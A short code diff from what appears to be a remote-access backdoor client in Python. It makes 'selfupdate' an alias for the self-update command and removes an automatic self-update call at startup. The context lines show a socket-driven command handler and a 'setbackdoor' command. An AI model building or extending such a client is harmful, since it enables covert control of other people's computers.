@@ -272,7 +272,7 @@ def interact(s, command):
             s.send(bytes('[CLIENT - ERROR] Directory missing\n'
                          + commands[1], 'utf-8'))
             print("[INFO] %s directory not found" % os.getcwd())
-    elif commands[0] == "selfupdateall":
+    elif commands[0] in ["selfupdateall", "selfupdate"]:
         selfUpdate()
         return None
     elif commands[0] == "setbackdoor":
@@ -452,7 +452,6 @@ def main(host, port):
                       "\n", __import__('traceback').print_exc())
                 break
 
-selfUpdate()
 if __name__ == '__main__':
     while True:
         try:
